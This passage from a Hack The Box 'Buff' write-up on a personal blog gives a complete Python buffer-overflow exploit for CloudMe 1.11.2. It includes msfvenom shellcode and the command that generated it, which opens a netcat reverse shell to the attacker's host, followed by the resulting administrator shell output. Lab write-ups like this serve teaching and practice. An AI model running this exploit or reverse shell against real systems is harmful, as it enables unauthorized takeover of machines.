</span></span><span style="display:flex;"><span><span style="color:#79c0ff">payload</span> <span style="color:#ff7b72;font-weight:bold">+=</span> b<span style="color:#a5d6ff">&#34;\x23\x5f\xce\x78\x1a\x90\x03\x78\x5b\xcd\xee\x28&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#79c0ff">payload</span> <span style="color:#ff7b72;font-weight:bold">+=</span> b<span style="color:#a5d6ff">&#34;\x34\x99\x5d\xdd\x31\xd7\x5d\x56\x09\xf9\xe5\x8b&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#79c0ff">payload</span> <span style="color:#ff7b72;font-weight:bold">+=</span> b<span style="color:#a5d6ff">&#34;\xd9\xf8\xc4\x1d\x52\xa3\xc6\x9c\xb7\xdf\x4e\x87&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#79c0ff">payload</span> <span style="color:#ff7b72;font-weight:bold">+=</span> b<span style="color:#a5d6ff">&#34;\xd4\xda\x19\x3c\x2e\x90\x9b\x94\x7f\x59\x37\xd9&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#79c0ff">payload</span> <span style="color:#ff7b72;font-weight:bold">+=</span> b<span style="color:#a5d6ff">&#34;\xb0\xa8\x49\x1d\x76\x53\x3c\x57\x85\xee\x47\xac&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#79c0ff">payload</span> <span style="color:#ff7b72;font-weight:bold">+=</span> b<span style="color:#a5d6ff">&#34;\xf4\x34\xcd\x37\x5e\xbe\x75\x9c\x5f\x13\xe3\x57&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#79c0ff">payload</span> <span style="color:#ff7b72;font-weight:bold">+=</span> b<span style="color:#a5d6ff">&#34;\x53\xd8\x67\x3f\x77\xdf\xa4\x4b\x83\x54\x4b\x9c&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#79c0ff">payload</span> <span style="color:#ff7b72;font-weight:bold">+=</span> b<span style="color:#a5d6ff">&#34;\x02\x2e\x68\x38\x4f\xf4\x11\x19\x35\x5b\x2d\x79&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#79c0ff">payload</span> <span style="color:#ff7b72;font-weight:bold">+=</span> b<span style="color:#a5d6ff">&#34;\x96\x04\x8b\xf1\x3a\x50\xa6\x5b\x50\xa7\x34\xe6&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#79c0ff">payload</span> <span style="color:#ff7b72;font-weight:bold">+=</span> b<span style="color:#a5d6ff">&#34;\x16\xa7\x46\xe9\x06\xc0\x77\x62\xc9\x97\x87\xa1&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#79c0ff">payload</span> <span style="color:#ff7b72;font-weight:bold">+=</span> b<span style="color:#a5d6ff">&#34;\xae\x68\xc2\xe8\x86\xe0\x8b\x78\x9b\x6c\x2c\x57&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#79c0ff">payload</span> <span style="color:#ff7b72;font-weight:bold">+=</span> b<span style="color:#a5d6ff">&#34;\xdf\x88\xaf\x52\x9f\x6e\xaf\x16\x9a\x2b\x77\xca&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#79c0ff">payload</span> <span style="color:#ff7b72;font-weight:bold">+=</span> b<span style="color:#a5d6ff">&#34;\xd6\x24\x12\xec\x45\x44\x37\xaf\x53\xe6\xc0\x51&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#79c0ff">payload</span> <span style="color:#ff7b72;font-weight:bold">+=</span> b<span style="color:#a5d6ff">&#34;\xce\x66\x41\xce\x78\xf3\xc5\x81\x1b\x88\x59\x39&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#79c0ff">payload</span> <span style="color:#ff7b72;font-weight:bold">+=</span> b<span style="color:#a5d6ff">&#34;\xa2\x03\x3e\xb0\x24\xb0\xd1\x5b\xa0\x14\x40\xff&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#79c0ff">payload</span> <span style="color:#ff7b72;font-weight:bold">+=</span> b<span style="color:#a5d6ff">&#34;\x06\xc0\xe4\x9a\x76\x3b\x25\x4b\x47\x0b\x6b\xa2&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#79c0ff">payload</span> <span style="color:#ff7b72;font-weight:bold">+=</span> b<span style="color:#a5d6ff">&#34;\x93\x45\x41\xe4\xef\xa9\x95\xd4\x2f\xe7\xb0\x34&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#79c0ff">payload</span> <span style="color:#ff7b72;font-weight:bold">+=</span> b<span style="color:#a5d6ff">&#34;\x4c\x9a\x5e\x1b\xf7\x1c\xfa\x63&#34;</span>
</span></span><span style="display:flex;"><span>┌─<span style="color:#ff7b72;font-weight:bold">[</span>matt@parrot<span style="color:#ff7b72;font-weight:bold">]</span>─<span style="color:#ff7b72;font-weight:bold">[</span>~/htb/buff<span style="color:#ff7b72;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span>└──╼$ 
</span></span></code></pre></div><p>With the aforementioned modifications, the python script looked like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"># Exploit Title: CloudMe 1.11.2 - Buffer Overflow (PoC)</span>
</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"># Date: 2020-04-27</span>
</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"># Exploit Author: Andy Bowden</span>
</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"># Vendor Homepage: https://www.cloudme.com/en</span>
</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"># Software Link: https://www.cloudme.com/downloads/CloudMe_1112.exe</span>
</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"># Version: CloudMe 1.11.2</span>
</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"># Tested on: Windows 10 x86</span>
</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">#Instructions:</span>
</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"># Start the CloudMe service and run the script.</span>
</span></span><span style="display:flex;"><span><span style="color:#ff7b72">import</span> <span style="color:#ff7b72">socket</span>
</span></span><span style="display:flex;"><span>target <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">&#34;127.0.0.1&#34;</span>
</span></span><span style="display:flex;"><span>padding1 <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;</span><span style="color:#79c0ff">\x90</span><span style="color:#a5d6ff">&#34;</span> <span style="color:#ff7b72;font-weight:bold">*</span> <span style="color:#a5d6ff">1052</span>
</span></span><span style="display:flex;"><span>EIP <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;</span><span style="color:#79c0ff">\xB5\x42\xA8\x68</span><span style="color:#a5d6ff">&#34;</span> <span style="color:#8b949e;font-style:italic"># 0x68A842B5 -&gt; PUSH ESP, RET</span>
</span></span><span style="display:flex;"><span>NOPS <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;</span><span style="color:#79c0ff">\x90</span><span style="color:#a5d6ff">&#34;</span> <span style="color:#ff7b72;font-weight:bold">*</span> <span style="color:#a5d6ff">30</span>
</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">#msfvenom -p windows/exec CMD=&#39;C:\xampp\htdocs\gym\upload\nc.exe 10.10.14.2 4000 -e cmd.exe&#39; -b &#39;\x00\x0a\0d&#39; -f python -v payload</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> <span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;</span><span style="color:#79c0ff">\xbf\x4a\xb2\x83\xb1\xdd\xc2\xd9\x74\x24\xf4\x5d</span><span style="color:#a5d6ff">&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> <span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;</span><span style="color:#79c0ff">\x31\xc9\xb1\x3e\x83\xc5\x04\x31\x7d\x0f\x03\x7d</span><span style="color:#a5d6ff">&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> <span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;</span><span style="color:#79c0ff">\x45\x50\x76\x4d\xb1\x16\x79\xae\x41\x77\xf3\x4b</span><span style="color:#a5d6ff">&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> <span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;</span><span style="color:#79c0ff">\x70\xb7\x67\x1f\x22\x07\xe3\x4d\xce\xec\xa1\x65</span><span style="color:#a5d6ff">&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> <span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;</span><span style="color:#79c0ff">\x45\x80\x6d\x89\xee\x2f\x48\xa4\xef\x1c\xa8\xa7</span><span style="color:#a5d6ff">&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> <span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;</span><span style="color:#79c0ff">\x73\x5f\xfd\x07\x4a\x90\xf0\x46\x8b\xcd\xf9\x1b</span><span style="color:#a5d6ff">&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> <span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;</span><span style="color:#79c0ff">\x44\x99\xac\x8b\xe1\xd7\x6c\x27\xb9\xf6\xf4\xd4</span><span style="color:#a5d6ff">&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> <span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;</span><span style="color:#79c0ff">\x09\xf8\xd5\x4a\x02\xa3\xf5\x6d\xc7\xdf\xbf\x75</span><span style="color:#a5d6ff">&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> <span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;</span><span style="color:#79c0ff">\x04\xe5\x76\x0d\xfe\x91\x88\xc7\xcf\x5a\x26\x26</span><span style="color:#a5d6ff">&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> <span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;</span><span style="color:#79c0ff">\xe0\xa8\x36\x6e\xc6\x52\x4d\x86\x35\xee\x56\x5d</span><span style="color:#a5d6ff">&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> <span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;</span><span style="color:#79c0ff">\x44\x34\xd2\x46\xee\xbf\x44\xa3\x0f\x13\x12\x20</span><span style="color:#a5d6ff">&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> <span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;</span><span style="color:#79c0ff">\x03\xd8\x50\x6e\x07\xdf\xb5\x04\x33\x54\x38\xcb</span><span style="color:#a5d6ff">&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> <span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;</span><span style="color:#79c0ff">\xb2\x2e\x1f\xcf\x9f\xf5\x3e\x56\x45\x5b\x3e\x88</span><span style="color:#a5d6ff">&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> <span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;</span><span style="color:#79c0ff">\x26\x04\x9a\xc2\xca\x51\x97\x88\x80\xa4\x25\xb7</span><span style="color:#a5d6ff">&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> <span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;</span><span style="color:#79c0ff">\xe6\xa7\x35\xb8\x56\xc0\x04\x33\x39\x97\x98\x96</span><span style="color:#a5d6ff">&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> <span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;</span><span style="color:#79c0ff">\x7e\x67\xd3\xbb\xd6\xe0\xba\x29\x6b\x6d\x3d\x84</span><span style="color:#a5d6ff">&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> <span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;</span><span style="color:#79c0ff">\xaf\x88\xbe\x2d\x4f\x6f\xde\x47\x4a\x2b\x58\xbb</span><span style="color:#a5d6ff">&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> <span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;</span><span style="color:#79c0ff">\x26\x24\x0d\xbb\x95\x45\x04\xf8\x23\xe6\xdf\x9e</span><span style="color:#a5d6ff">&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> <span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;</span><span style="color:#79c0ff">\x3e\x66\x50\x3d\xa8\xf2\xf4\xd2\x4b\x88\xa8\x4b</span><span style="color:#a5d6ff">&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> <span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;</span><span style="color:#79c0ff">\xf2\x03\x0d\xe1\x74\xb0\xc2\x68\x10\x14\x73\x08</span><span style="color:#a5d6ff">&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> <span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;</span><span style="color:#79c0ff">\xf6\xc1\xf3\xab\x26\x3b\x34\x1a\x17\x0b\x1a\x53</span><span style="color:#a5d6ff">&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> <span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;</span><span style="color:#79c0ff">\x63\x45\x50\xb3\xbf\xa9\xa4\x83\x9f\xe4\xa1\xc3</span><span style="color:#a5d6ff">&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> <span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;</span><span style="color:#79c0ff">\xbc\x9b\x4d\x2a\x27\x1c\xeb\x32</span><span style="color:#a5d6ff">&#34;</span>
</span></span><span style="display:flex;"><span>overrun <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;C&#34;</span> <span style="color:#ff7b72;font-weight:bold">*</span> (<span style="color:#a5d6ff">1500</span> <span style="color:#ff7b72;font-weight:bold">-</span> len(padding1 <span style="color:#ff7b72;font-weight:bold">+</span> NOPS <span style="color:#ff7b72;font-weight:bold">+</span> EIP <span style="color:#ff7b72;font-weight:bold">+</span> payload))
</span></span><span style="display:flex;"><span>buf <span style="color:#ff7b72;font-weight:bold">=</span> padding1 <span style="color:#ff7b72;font-weight:bold">+</span> EIP <span style="color:#ff7b72;font-weight:bold">+</span> NOPS <span style="color:#ff7b72;font-weight:bold">+</span> payload <span style="color:#ff7b72;font-weight:bold">+</span> overrun
</span></span><span style="display:flex;"><span><span style="color:#ff7b72">try</span>:
</span></span><span style="display:flex;"><span>    s<span style="color:#ff7b72;font-weight:bold">=</span>socket<span style="color:#ff7b72;font-weight:bold">.</span>socket(socket<span style="color:#ff7b72;font-weight:bold">.</span>AF_INET, socket<span style="color:#ff7b72;font-weight:bold">.</span>SOCK_STREAM)
</span></span><span style="display:flex;"><span>    s<span style="color:#ff7b72;font-weight:bold">.</span>connect((target, <span style="color:#a5d6ff">8891</span>))
</span></span><span style="display:flex;"><span>    s<span style="color:#ff7b72;font-weight:bold">.</span>send(buf)
</span></span><span style="display:flex;"><span><span style="color:#ff7b72">except</span> <span style="color:#f0883e;font-weight:bold">Exception</span> <span style="color:#ff7b72">as</span> e:
</span></span><span style="display:flex;"><span>    print(sys<span style="color:#ff7b72;font-weight:bold">.</span>exc_value)
</span></span></code></pre></div><p>From there, it was as simple as setting up a netcat listener, running the script, and reaping the benefits.</p>
<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌─<span style="color:#ff7b72;font-weight:bold">[</span>matt@parrot<span style="color:#ff7b72;font-weight:bold">]</span>─<span style="color:#ff7b72;font-weight:bold">[</span>~/htb/buff<span style="color:#ff7b72;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span>└──╼$ sudo python3 cloudmebof.py
</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>sudo<span style="color:#ff7b72;font-weight:bold">]</span> password <span style="color:#ff7b72">for</span> matt:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>┌─<span style="color:#ff7b72;font-weight:bold">[</span>matt@parrot<span style="color:#ff7b72;font-weight:bold">]</span>─<span style="color:#ff7b72;font-weight:bold">[</span>~/htb/buff<span style="color:#ff7b72;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span>└──╼$ nc -nvlp <span style="color:#a5d6ff">4000</span>
</span></span><span style="display:flex;"><span>listening on <span style="color:#ff7b72;font-weight:bold">[</span>any<span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#a5d6ff">4000</span> ...
</span></span><span style="display:flex;"><span>connect to <span style="color:#ff7b72;font-weight:bold">[</span>10.10.14.2<span style="color:#ff7b72;font-weight:bold">]</span> from <span style="color:#ff7b72;font-weight:bold">(</span>UNKNOWN<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#ff7b72;font-weight:bold">[</span>10.10.10.198<span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#a5d6ff">49681</span>
</span></span><span style="display:flex;"><span>Microsoft Windows <span style="color:#ff7b72;font-weight:bold">[</span>Version 10.0.17134.1610<span style="color:#ff7b72;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">(</span>c<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#a5d6ff">2018</span> Microsoft Corporation. All rights reserved.
</span></span><span style="display:flex;"><span>C:<span style="color:#79c0ff">\W</span>indows<span style="color:#79c0ff">\s</span>ystem32&gt;whoami
</span></span><span style="display:flex;"><span>whoami
</span></span><span style="display:flex;"><span>buff<span style="color:#79c0ff">\a</span>dministrator
</span></span><span style="display:flex;"><span>C:<span style="color:#79c0ff">\W</span>indows<span style="color:#79c0ff">\s</span>ystem32&gt;cd c:<span style="color:#79c0ff">\u</span>sers<span style="color:#79c0ff">\a</span>dministrator<span style="color:#79c0ff">\d</span>esktop
</span></span><span style="display:flex;"><span>cd c:<span style="color:#79c0ff">\u</span>sers<span style="color:#79c0ff">\a</span>dministrator<span style="color:#79c0ff">\d</span>esktop
</span></span><span style="display:flex;"><span>c:<span style="color:#79c0ff">\U</span>sers<span style="color:#79c0ff">\A</span>dministrator<span style="color:#79c0ff">\D</span>esktop&gt;dir
</span></span><span style="display:flex;"><span>dir
</span></span><span style="display:flex;"><span>Volume in drive C has no label.
</span></span><span style="display:flex;"><span>Volume Serial Number is A22D-49F7
</span></span><span style="display:flex;"><span>Directory of c:<span style="color:#79c0ff">\U</span>sers<span style="color:#79c0ff">\A</span>dministrator<span style="color:#79c0ff">\D</span>esktop
</span></span><span style="display:flex;"><span>18/07/2020 17:36 &lt;DIR&gt; .
</span></span><span style="display:flex;"><span>18/07/2020 17:36 &lt;DIR&gt; ..
</span></span><span style="display:flex;"><span>16/06/2020 16:41 1,417 Microsoft Edge.lnk
</span></span><span style="display:flex;"><span>27/09/2020 18:36 <span style="color:#a5d6ff">34</span> root.txt
</span></span><span style="display:flex;"><span><span style="color:#a5d6ff">2</span> File<span style="color:#ff7b72;font-weight:bold">(</span>s<span style="color:#ff7b72;font-weight:bold">)</span> 1,451 bytes
</span></span><span style="display:flex;"><span><span style="color:#a5d6ff">2</span> Dir<span style="color:#ff7b72;font-weight:bold">(</span>s<span style="color:#ff7b72;font-weight:bold">)</span> 7,574,896,640 bytes free
</span></span><span style="display:flex;"><span>c:<span style="color:#79c0ff">\U</span>sers<span style="color:#79c0ff">\A</span>dministrator<span style="color:#79c0ff">\D</span>esktop&gt;
</span></span></code></pre></div>
      </div>


      <footer>
        


        
        
        
        
        
        
        
      </footer>
    </article>

    
  </section>

    </div>

    <footer class="footer">
  <section class="container">
    ©
    
      2020 -
    
    2025
     matt johnson 
    ·
    
    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder</a>.
    
  </section>
</footer>

  </main>

  

  
  
  <script src="/js/coder.js"></script>
  

  

  


  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  
</body>
</html>
